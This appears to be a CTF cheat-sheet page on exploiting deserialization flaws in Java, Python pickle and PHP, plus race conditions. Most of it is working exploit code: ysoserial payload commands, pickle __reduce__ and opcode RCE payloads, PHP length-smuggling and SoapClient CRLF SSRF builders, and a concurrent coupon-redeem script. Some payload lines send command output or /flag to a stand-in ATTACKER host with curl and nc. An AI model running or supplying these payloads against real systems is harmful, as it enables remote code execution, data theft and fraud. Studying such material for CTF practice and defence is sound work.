# CTF Web - Deserialization and Race Conditions

Object-injection sinks (Java `ObjectInputStream`, Python `pickle`, PHP `unserialize`) and time-of-check-to-time-of-use races. For injection attacks (SQLi, SSTI, SSRF, command injection), see [server-side.md](server-side.md). For code-execution playbooks and the inline stubs that point here, see [server-side-exec-2.md](server-side-exec-2.md). For CVE-specific exploits and advanced bypasses, see [server-side-advanced.md](server-side-advanced.md).

## Table of Contents
- [Java Deserialization (ysoserial)](#java-deserialization-ysoserial)
- [Python Pickle Deserialization](#python-pickle-deserialization)
- [Pickle Chaining via STOP Opcode Stripping (VolgaCTF 2013)](#pickle-chaining-via-stop-opcode-stripping-volgactf-2013)
- [PHP Serialization Length Manipulation via Filter Word Expansion (0CTF 2016)](#php-serialization-length-manipulation-via-filter-word-expansion-0ctf-2016)
- [PHP SoapClient CRLF SSRF via Deserialization](#php-soapclient-crlf-ssrf-via-deserialization)
- [Race Conditions (Time-of-Check to Time-of-Use)](#race-conditions-time-of-check-to-time-of-use)

---

## Java Deserialization (ysoserial)

**Pattern:** A servlet, RMI endpoint, or framework reads attacker-controlled bytes through `ObjectInputStream.readObject()`. If a gadget-bearing library is on the classpath, a crafted object graph triggers RCE during deserialization — before the application ever inspects the object type.

**Recognition:** base64 that decodes to `\xac\xed\x00\x05` (raw `aced0005`, base64 prefix `rO0AB`). Common carriers: cookies, hidden form fields, `viewState`, RMI/JMX ports, T3 (WebLogic), JNDI lookups.

**Key insight:** the vulnerability is `readObject()` on untrusted input plus a reachable gadget chain. You do not need application classes — you need a `commons-collections`, `spring`, `groovy`, or similar library whose deserialization side effects reach `Runtime.exec` / template evaluation / JNDI.

```bash
# Generate a payload; pick the chain matching the classpath
java -jar ysoserial.jar CommonsCollections6 'curl http://ATTACKER/$(id|base64)' | base64 -w0

# Blind detection when no output channel exists: URLDNS fires a DNS lookup
java -jar ysoserial.jar URLDNS 'http://UNIQUE.dnslog.attacker' | base64 -w0
```

Chain selection: `CommonsCollections1-7` (differ by CC version and JDK), `CommonsBeanutils1`, `Groovy1`, `Spring1/2`, `Jdk7u21`/`Jdk8u20` (pure-JDK, no third-party lib). If the exact chain is unknown, spray `URLDNS` first to confirm the sink reaches deserialization, then enumerate chains against the observed library versions.

**Modern JDK note:** JEP 290 serialization filters (`ObjectInputFilter`) may block classes by name. Bypasses rely on allowed gadget packages or filter misconfiguration. If a filter blocks CommonsCollections, test JDK-only chains.

---

## Python Pickle Deserialization

**Pattern:** `pickle.loads()` (also `pickle.load`, `_pickle`, and indirectly `yaml.load` with the default Loader, `torch.load`, `joblib.load`, `pandas.read_pickle`) reconstructs objects by calling `__reduce__`. An attacker-supplied `__reduce__` returning `(callable, args)` runs that callable during unpickling — instant RCE.

**Recognition:** Flask session cookies with a `pickle`-based serializer, cached ML model files, Redis/memcached object stores, any endpoint that base64-decodes then unpickles.

```python
import pickle, base64, os

class RCE:
    def __reduce__(self):
        return (os.system, ('curl http://ATTACKER/$(id|base64 -w0)',))

payload = base64.b64encode(pickle.dumps(RCE()))
print(payload.decode())
```

**Restricted unpickler bypass:** hardened targets subclass `pickle.Unpickler` and override `find_class` to whitelist modules. Bypasses:

- Reach an allowed module that re-exports a dangerous callable (e.g. `builtins.getattr`, `builtins.eval`, `os.system`, `subprocess`).
- If only `builtins` is allowed, chain `getattr`/`eval`/`exec` via the `R`/`c`/`o` opcodes to rebuild a sink.
- Hand-write opcodes (`c` = GLOBAL import `module\nname`, `(` = MARK, `t` = TUPLE, `R` = REDUCE) when `pickle.dumps` won't emit the exact global you need.

```python
# Hand-crafted opcode payload calling os.system
payload = b"cos\nsystem\n(S'id'\ntR."
```

---

## Pickle Chaining via STOP Opcode Stripping (VolgaCTF 2013)

**Pattern:** The service concatenates or wraps two pickle streams (e.g. a fixed header pickle plus a user pickle) and passes the whole buffer to a single `pickle.loads()`. A pickle stream ends at the STOP opcode `.` (`\x2e`); `loads` returns the object on the *first* STOP and ignores trailing bytes. Strip the STOP byte from the first payload so the machine keeps executing into the second payload — both `__reduce__` callables fire in one `loads()`.

**Key insight:** this defeats designs that assume "the trusted header pickle runs, then we stop." Removing its terminating `.` lets your appended opcodes execute in the same virtual machine, after the trusted setup has run.

```python
import pickle, os

class Exec:
    def __reduce__(self):
        return (os.system, ('/bin/sh -c "cat /flag | nc ATTACKER 4444"',))

first  = pickle.dumps({'ok': True})      # trusted-looking header
second = pickle.dumps(Exec())

# Drop the STOP (\x2e) that terminates the first stream, then append the second
payload = first.rstrip(b'.') + second
```

For output when the process has no stdout back to you, make the payload `os.dup2()` a socket onto fd 0/1/2 before spawning a shell, or exfiltrate through the same request channel.

---

## PHP Serialization Length Manipulation via Filter Word Expansion (0CTF 2016)

**Pattern:** The app applies a string filter to serialized data *after* `serialize()` but *before* `unserialize()`, and the filter changes the byte length of the payload (e.g. a WAF-style replace `"where" -> "hacker"`). PHP serialization encodes string lengths explicitly (`s:5:"where"`), so any replacement that shifts length desynchronizes the length prefixes from the actual bytes. Overflowing by a controlled number of bytes lets injected serialized fields "appear" out of the smuggled tail.

**Key insight:** replacing a 5-char token with a 6-char token adds one byte per hit. Repeat the token N times so the cumulative expansion is exactly the length of an injected field, and the parser realigns onto attacker data.

```php
// Property whose value passes through the length-changing filter
// "where" (5) -> "hacker" (6): +1 byte each occurrence
$payload = str_repeat("where", 27);   // tune N so expansion == injected bytes
// Smuggled tail that becomes a new serialized property after realignment:
// ";}s:5:"photo";s:10:"config.php";}
```

**Method:** (1) count the exact byte delta the filter introduces per hit; (2) compute how many hits are needed so the serialized string that was `s:LEN:"..."` now under-declares its length by exactly the size of your injected `";}s:...;}` tail; (3) place the injected serialized field in the smuggled region. Same idea applies to any custom serialization with fixed-width length fields and a post-serialization mutation.

---

## PHP SoapClient CRLF SSRF via Deserialization

**Pattern:** `unserialize()` on a `SoapClient` object gives SSRF with header control. Instantiating `SoapClient` doesn't call out, but any later method call (or the `__call` triggered by an undefined method during the same request) sends an HTTP request to the attacker-set `location`. A CRLF (`\r\n`) injected into the `user_agent` option splits the request, letting you inject arbitrary headers and a body — enough to smuggle a second request (e.g. an internal POST).

**Key insight:** the `uri`/`location` are attacker-controlled through the deserialized object, and `user_agent` is reflected verbatim into the request headers, so `\r\n` breaks out of the UA line.

```php
$target = 'http://127.0.0.1:PORT/internal';
$ua = "AAA\r\nContent-Type: application/x-www-form-urlencoded\r\n".
      "Content-Length: 13\r\n\r\ncmd=cat+flag"; // smuggled body
$c = new SoapClient(null, array(
    'location' => $target,
    'uri'      => 'x',
    'user_agent' => $ua,
));
echo urlencode(serialize($c));  // deliver where unserialize() runs; trigger a call
```

Only HTTP(S) is reachable this way, and the smuggled body length must match `Content-Length`. Use it to hit internal-only endpoints, gopher-adjacent SSRF chains, or session/CSRF-gated actions from the server's own origin.

---

## Race Conditions (Time-of-Check to Time-of-Use)

**Pattern:** The server checks a condition and acts on it in two non-atomic steps (check balance -> deduct; check coupon unused -> redeem; check username free -> create). Concurrent requests that all pass the check before any commits let every request act on the stale pre-modification state — double-spend, multi-redeem, duplicate-account.

**Key insight:** the window is between the read and the write. Fire many requests so they interleave inside that window. Two delivery tricks tighten it: HTTP/1.1 last-byte sync (send all requests minus the final byte, then release the last bytes together) and HTTP/2 single-packet attack (multiplex many requests in one TCP packet, removing network jitter).

```python
import asyncio, aiohttp

async def hit(session, url, data):
    async with session.post(url, data=data) as r:
        return await r.text()

async def main():
    url = "http://target/redeem"
    data = {"coupon": "ONCE"}
    async with aiohttp.ClientSession() as s:
        # 50 concurrent requests all read "coupon unused" before any commits
        results = await asyncio.gather(*(hit(s, url, data) for _ in range(50)))
    print(sum("success" in x for x in results), "wins")

asyncio.run(main())
```

**Detection/repro:** a single request succeeds once; N parallel requests succeed >1 time. Record the success count vs. concurrency and confirm it drops to 1 when a lock/transaction is added (negative control). For byte-level sync use Burp's Turbo Intruder single-packet mode or an HTTP/2 client.
